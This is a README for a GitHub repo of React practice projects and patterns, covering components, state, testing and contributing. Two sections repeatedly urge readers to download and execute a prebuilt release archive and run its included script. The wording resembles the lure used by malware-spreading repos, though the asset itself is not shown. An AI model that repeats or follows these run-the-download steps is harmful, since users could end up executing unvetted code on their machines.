About
This repo collects practical React projects and patterns you can reuse in real apps. Each example highlights a common problem and shows a focused solution. The code aims to be readable, modular, and ready to extend.

Key concepts
- Component composition over deep inheritance
- Single responsibility for components
- Declarative UI with hooks and controlled inputs
- Small, testable modules
- Simple routing and lazy loading
- CSS modules or styled components for scoped styles

Features
- Several mini-projects that mimic real app slices
  - Auth flow with token refresh
  - Data table with sorting, filtering, pagination
  - Form kit with validation and nested fields
  - Dashboard widgets with drag-and-drop
  - Theme switcher (light/dark) with persisted state
- Example patterns:
  - Container / Presentational split
  - Compound components
  - Render props and custom hooks
- Build scripts for development and production
- Unit and integration tests using Jest and React Testing Library
- Storybook stories for UI components

Quick start
These commands get a local copy running.

1. Clone the repo
   git clone https://github.com/andiwadi/React-Project-Practices-2.git
2. Install dependencies
   cd React-Project-Practices-2
   npm install
3. Run dev server
   npm start

Install releases
This project publishes packaged release assets on GitHub. Download and execute the release file from the releases page linked below. The release asset contains a prebuilt bundle and a basic run script. Follow these steps:

- Visit the releases page: https://github.com/andiwadi/React-Project-Practices-2/releases
- Download the latest asset that matches your platform (zip or tar.gz).
- Unpack the archive.
- Run the included start script:
  - On macOS/Linux: chmod +x run.sh && ./run.sh
  - On Windows: run.cmd

If the link does not work for you, check the "Releases" section on GitHub for available builds or manual assets.

Project structure
- /packages
  - app-main — main demo app
  - ui-kit — shared components
  - hooks — custom hooks used across apps
- /examples
  - auth-flow
  - data-table
  - form-kit
  - dashboard
- /tools
  - scripts for building and publishing
- .storybook — storybook config
- jest.config.js — test setup

Core folders
- src/components — small, focused UI components
- src/containers — components that handle data & state
- src/hooks — reusable hooks (useFetch, useDebounce)
- src/services — API clients and mock servers
- src/styles — tokens and global styles

Component patterns covered
- Compound components
  - Use a parent component to hold state and expose subcomponents.
- Controlled vs uncontrolled inputs
  - Show both approaches and when to prefer each.
- Higher-order components (HOCs)
  - Short examples to wrap behavior.
- Render props
  - Flexible render-time composition.
- Portals
  - Modals and tooltips rendered outside normal DOM flow.
- Suspense and lazy
  - Code-splitting with fallback UI.

State management
- useState and useReducer for local state
- Context for app-level settings (theme, locale)
- Custom hooks for encapsulating business logic
- Example integration with Redux Toolkit for larger slices
- Minimal side-effects via useEffect and abort controllers

Styling approach
- CSS Modules for component scope
- Utility-first classes for layout
- Theming via CSS variables and a ThemeProvider
- Example with styled-components for interactive widgets

Testing
- Unit tests with Jest
- React Testing Library for component behavior
- Example end-to-end test with Playwright
- Test patterns:
  - Mock fetch calls with msw
  - Test hooks via renderHook
  - Snapshot only for stable UI pieces

Scripts
- npm start — dev server (hot reload)
- npm run build — production build
- npm run test — run unit tests
- npm run storybook — develop UI components in isolation
- npm run lint — run ESLint
- npm run format — run Prettier

Code style
- ESLint with recommended rules and React plugin
- Prettier for formatting
- Git hooks with husky to run lint and tests before commit

Performance tips in the repo
- Memoize heavy components with React.memo
- Use useCallback and useMemo where appropriate
- Defer non-critical work with requestIdleCallback
- Serve compressed assets and enable long-term caching
- Optimize images and SVGs; use sprites where useful

Accessibility
- Focus management in modals and menus
- Keyboard navigation on interactive widgets
- Proper ARIA roles on dynamic UI
- Contrast checks for color themes

Contributing
I accept issues and pull requests. Follow these steps to contribute:
1. Fork the repo.
2. Create a branch per feature or fix.
3. Run tests and lint locally.
4. Submit a PR with a clear description and examples.

When you open a PR
- Explain the problem and the change.
- Show screenshots or storybook entries if applicable.
- Keep commits small and focused.

Release assets and where to find them
You will find prebuilt release assets at the releases page. Download and execute the release file from the releases page to run a packaged build. Visit:
https://github.com/andiwadi/React-Project-Practices-2/releases

If the page does not list an asset you need, open an issue or check the latest tags for source bundles.

Roadmap
- Add TypeScript migration examples for each pattern
- Add GraphQL client patterns using Apollo and urql
- Implement more e2e tests for common flows
- Add mobile layout patterns and responsive components
- Expand Storybook with full design tokens

FAQ
Q: Which React version does this target?
A: The examples target the latest LTS React and demonstrate hooks and Suspense APIs.

Q: Can I use parts of this in my project?
A: Yes. Use the UI kit components or copy patterns. Keep licensing in mind.

Q: Are the examples production-ready?
A: They show solid patterns and a base setup. Treat them as a foundation and adapt them to your constraints.
